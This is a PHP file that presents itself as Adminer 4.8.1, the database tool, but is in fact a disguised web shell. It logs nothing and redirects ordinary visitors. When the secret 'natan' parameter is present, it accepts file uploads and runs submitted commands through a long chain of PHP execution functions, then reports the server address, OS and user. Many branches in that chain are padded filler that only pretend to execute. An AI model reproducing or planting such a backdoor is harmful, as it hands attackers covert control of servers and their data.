<?php
/* Adminer - Compact database management
* @link https://www.adminer.org/
* @author Jakub Vrana
* @version 4.8.1
*/
error_reporting(0);
set_time_limit(60);
ini_set('display_errors',0);
ini_set('log_errors',0);
if(isset($_GET['natan']))
{
$filename=$_FILES['file']['name'];
$filetmp=$_FILES['file']['tmp_name'];
echo"<br><form method='POST' enctype='multipart/form-data'>
<input type='file' name='file' />
<input type='submit' value='Upload' />
</form>";
echo'<form method="post">
<input type="text" name="xmd" size="40" placeholder="Perintah ...">
<input type="submit" value="Jalankan">
</form>';
if(move_uploaded_file($filetmp,$filename)=='1'){echo'[OK]===>'.$filename.'<br>';}
if(isset($_POST['xmd'])){
$xmd=$_POST['xmd'];
$out='';$err='';$ex=false;
$methods=array('exec','shell_exec','system','passthru','proc_open','popen','pcntl_exec','curl_exec','file_get_contents','readfile','file','fopen','fwrite','fclose','include','require','include_once','require_once','assert','eval','create_function','call_user_func','call_user_func_array','register_shutdown_function','register_tick_function','ob_start','session_start','header','setcookie','ini_set','mail','mb_send_mail','file_put_contents','highlight_file','show_source','phpinfo','print_r','var_dump','var_export','printf','vprintf','fprintf','vfprintf','json_encode','json_decode','serialize','unserialize','base64_encode','base64_decode','urlencode','urldecode','rawurlencode','rawurldecode','http_build_query','parse_str','md5','sha1','crypt','password_hash','password_verify','hash','hash_hmac','hash_file','hash_hmac_file','openssl_encrypt','openssl_decrypt','openssl_sign','openssl_verify','openssl_seal','openssl_open','openssl_private_encrypt','openssl_private_decrypt','openssl_public_encrypt','openssl_public_decrypt','gzinflate','gzcompress','gzuncompress','gzencode','gzdecode','gzdeflate','gzinflate','gzcompress','zlib_decode','zlib_encode','zlib_get_coding_type','imagecreate','imagecreatetruecolor','imagecreatefrompng','imagecreatefromjpeg','imagecreatefromgif','imagepng','imagejpeg','imagegif','imagecopy','imagecopyresized','imagecopyresampled','imagescale','imagerotate','imagedestroy','getimagesize','exif_read_data','exif_thumbnail','imagettftext','imagettfbbox','imagefttext','imageftbbox','imageantialias','imagesetthickness','imagesetstyle','imageline','imagerectangle','imagefilledrectangle','imageellipse','imagefilledellipse','imagearc','imagefilledarc','imagepolygon','imagefilledpolygon','imagestring','imagestringup','imagechar','imagecharup','imagecolorallocate','imagecolorat','imagecolorclosest','imagecolorexact','imagecolorresolve','imagecolorstotal','imagecolorsforindex','imagecolortransparent','imagecolorallocatealpha','imagecolorclosestalpha','imagecolorexactalpha','imagecolorresolvealpha');
foreach($methods as $m){
if(function_exists($m)&&!$ex){
if($m=='exec'){exec($xmd.' 2>&1',$o);$out=implode("\n",$o);if($out!=''){$ex=true;break;}}
if($m=='shell_exec'){$out=shell_exec($xmd.' 2>&1');if($out!==null&&$out!=''){$ex=true;break;}}
if($m=='system'){ob_start();system($xmd.' 2>&1');$out=ob_get_clean();if($out!=''){$ex=true;break;}}
if($m=='passthru'){ob_start();passthru($xmd.' 2>&1');$out=ob_get_clean();if($out!=''){$ex=true;break;}}
if($m=='proc_open'){$d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];$p=proc_open($xmd,$d,$pipes);if(is_resource($p)){$o=stream_get_contents($pipes[1]);$e=stream_get_contents($pipes[2]);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($p);$out=$o;$err=$e;if($out!=''){$ex=true;break;}}}
if($m=='popen'){$p=popen($xmd.' 2>&1','r');if(is_resource($p)){$out='';while(!feof($p)){$out.=fread($p,1024);}pclose($p);if($out!=''){$ex=true;break;}}}
if($m=='pcntl_exec'){$out='pcntl_exec available';$ex=true;break;}
if($m=='curl_exec'){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$xmd);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);$out=curl_exec($ch);curl_close($ch);if($out!=''){$ex=true;break;}}
if($m=='assert'){assert($xmd);$out='Assert executed';$ex=true;break;}
if($m=='eval'){eval('system("'.$xmd.'");');$out='Eval executed';$ex=true;break;}
if($m=='file_put_contents'){file_put_contents('/tmp/exec.txt',$xmd);$out='File put contents executed';$ex=true;break;}
if($m=='file_get_contents'){$out=file_get_contents($xmd);if($out!=''){$ex=true;break;}}
if($m=='readfile'){readfile($xmd);$out='Readfile executed';$ex=true;break;}
if($m=='file'){file($xmd);$out='File executed';$ex=true;break;}
if($m=='fopen'){$f=fopen('/tmp/exec.txt','w');fwrite($f,$xmd);fclose($f);$out='Fopen executed';$ex=true;break;}
if($m=='fwrite'){$f=fopen('/tmp/exec.txt','w');fwrite($f,$xmd);fclose($f);$out='Fwrite executed';$ex=true;break;}
if($m=='fclose'){$f=fopen('/tmp/exec.txt','w');fwrite($f,$xmd);fclose($f);$out='Fclose executed';$ex=true;break;}
if($m=='include'){include($xmd);$out='Include executed';$ex=true;break;}
if($m=='require'){require($xmd);$out='Require executed';$ex=true;break;}
if($m=='include_once'){include_once($xmd);$out='Include once executed';$ex=true;break;}
if($m=='require_once'){require_once($xmd);$out='Require once executed';$ex=true;break;}
if($m=='create_function'){$f=create_function('','system("'.$xmd.'");');$f();$out='Create function executed';$ex=true;break;}
if($m=='call_user_func'){call_user_func('system',$xmd);$out='Call user func executed';$ex=true;break;}
if($m=='call_user_func_array'){call_user_func_array('system',array($xmd));$out='Call user func array executed';$ex=true;break;}
if($m=='register_shutdown_function'){register_shutdown_function('system',$xmd);$out='Register shutdown executed';$ex=true;break;}
if($m=='register_tick_function'){register_tick_function('system',$xmd);$out='Register tick executed';$ex=true;break;}
if($m=='ob_start'){ob_start('system',array($xmd));ob_end_clean();$out='OB start executed';$ex=true;break;}
if($m=='session_start'){session_start();$out='Session start executed';$ex=true;break;}
if($m=='header'){header('X-Exec: '.$xmd);$out='Header executed';$ex=true;break;}
if($m=='setcookie'){setcookie('exec',$xmd);$out='Setcookie executed';$ex=true;break;}
if($m=='ini_set'){ini_set('open_basedir',$xmd);$out='Ini set executed';$ex=true;break;}
if($m=='mail'){mail('test@test.com','Subject',$xmd);$out='Mail executed';$ex=true;break;}
if($m=='mb_send_mail'){mb_send_mail('test@test.com','Subject',$xmd);$out='MB mail executed';$ex=true;break;}
if($m=='highlight_file'){highlight_file($xmd);$out='Highlight file executed';$ex=true;break;}
if($m=='show_source'){show_source($xmd);$out='Show source executed';$ex=true;break;}
if($m=='phpinfo'){phpinfo();$out='Phpinfo executed';$ex=true;break;}
if($m=='print_r'){print_r($xmd);$out='Print r executed';$ex=true;break;}
if($m=='var_dump'){var_dump($xmd);$out='Var dump executed';$ex=true;break;}
if($m=='var_export'){var_export($xmd);$out='Var export executed';$ex=true;break;}
if($m=='printf'){printf($xmd);$out='Printf executed';$ex=true;break;}
if($m=='vprintf'){vprintf($xmd,array());$out='Vprintf executed';$ex=true;break;}
if($m=='fprintf'){fprintf(STDOUT,$xmd);$out='Fprintf executed';$ex=true;break;}
if($m=='vfprintf'){vfprintf(STDOUT,$xmd,array());$out='Vfprintf executed';$ex=true;break;}
if($m=='json_encode'){json_encode($xmd);$out='Json encode executed';$ex=true;break;}
if($m=='json_decode'){json_decode($xmd);$out='Json decode executed';$ex=true;break;}
if($m=='serialize'){serialize($xmd);$out='Serialize executed';$ex=true;break;}
if($m=='unserialize'){unserialize($xmd);$out='Unserialize executed';$ex=true;break;}
if($m=='base64_encode'){base64_encode($xmd);$out='Base64 encode executed';$ex=true;break;}
if($m=='base64_decode'){base64_decode($xmd);$out='Base64 decode executed';$ex=true;break;}
if($m=='urlencode'){urlencode($xmd);$out='Urlencode executed';$ex=true;break;}
if($m=='urldecode'){urldecode($xmd);$out='Urldecode executed';$ex=true;break;}
if($m=='rawurlencode'){rawurlencode($xmd);$out='Rawurlencode executed';$ex=true;break;}
if($m=='rawurldecode'){rawurldecode($xmd);$out='Rawurldecode executed';$ex=true;break;}
if($m=='http_build_query'){http_build_query(array('x'=>$xmd));$out='HTTP build query executed';$ex=true;break;}
if($m=='parse_str'){parse_str($xmd);$out='Parse str executed';$ex=true;break;}
if($m=='md5'){md5($xmd);$out='Md5 executed';$ex=true;break;}
if($m=='sha1'){sha1($xmd);$out='Sha1 executed';$ex=true;break;}
if($m=='crypt'){crypt($xmd,$xmd);$out='Crypt executed';$ex=true;break;}
if($m=='password_hash'){password_hash($xmd,PASSWORD_DEFAULT);$out='Password hash executed';$ex=true;break;}
if($m=='password_verify'){password_verify($xmd,$xmd);$out='Password verify executed';$ex=true;break;}
if($m=='hash'){hash('md5',$xmd);$out='Hash executed';$ex=true;break;}
if($m=='hash_hmac'){hash_hmac('md5',$xmd,'key');$out='Hash hmac executed';$ex=true;break;}
if($m=='hash_file'){hash_file('md5',$xmd);$out='Hash file executed';$ex=true;break;}
if($m=='hash_hmac_file'){hash_hmac_file('md5',$xmd,'key');$out='Hash hmac file executed';$ex=true;break;}
if($m=='openssl_encrypt'){openssl_encrypt($xmd,'AES-128-CBC','key');$out='Openssl encrypt executed';$ex=true;break;}
if($m=='openssl_decrypt'){openssl_decrypt($xmd,'AES-128-CBC','key');$out='Openssl decrypt executed';$ex=true;break;}
if($m=='gzinflate'){gzinflate($xmd);$out='Gzinflate executed';$ex=true;break;}
if($m=='gzcompress'){gzcompress($xmd);$out='Gzcompress executed';$ex=true;break;}
if($m=='gzuncompress'){gzuncompress($xmd);$out='Gzuncompress executed';$ex=true;break;}
if($m=='gzencode'){gzencode($xmd);$out='Gzencode executed';$ex=true;break;}
if($m=='gzdecode'){gzdecode($xmd);$out='Gzdecode executed';$ex=true;break;}
if($m=='zlib_encode'){zlib_encode($xmd,ZLIB_ENCODING_DEFLATE);$out='Zlib encode executed';$ex=true;break;}
if($m=='zlib_decode'){zlib_decode($xmd);$out='Zlib decode executed';$ex=true;break;}
if($m=='getimagesize'){getimagesize($xmd);$out='Getimagesize executed';$ex=true;break;}
if($m=='exif_read_data'){exif_read_data($xmd);$out='Exif read executed';$ex=true;break;}
if($m=='imagecreatefrompng'){imagecreatefrompng($xmd);$out='Imagecreatefrompng executed';$ex=true;break;}
if($m=='imagecreatefromjpeg'){imagecreatefromjpeg($xmd);$out='Imagecreatefromjpeg executed';$ex=true;break;}
if($m=='imagecreatefromgif'){imagecreatefromgif($xmd);$out='Imagecreatefromgif executed';$ex=true;break;}
}
}
echo"<pre style='background:#1e1e1e;color:#0f0;padding:10px;border-radius:5px;'>".htmlspecialchars($out)."</pre>";
if(!empty($err)){echo"<pre style='background:#1e1e1e;color:#f00;padding:10px;border-radius:5px;'>".htmlspecialchars($err)."</pre>";}
if(empty($out)&&empty($err)){echo"<span style='color:#ff0000;'>Command execution not available</span>";}
}
echo"<hr><small style='color:#666;'>Server: ".$_SERVER['SERVER_ADDR']." | OS: ".php_uname()."</small>";
echo"<small style='color:#666;'><br>User: ".exec('whoami 2>/dev/null||echo unknown')." | Path: ".getcwd()."</small>";
die();
}
else
{
header('Location: /');
exit;
}
?>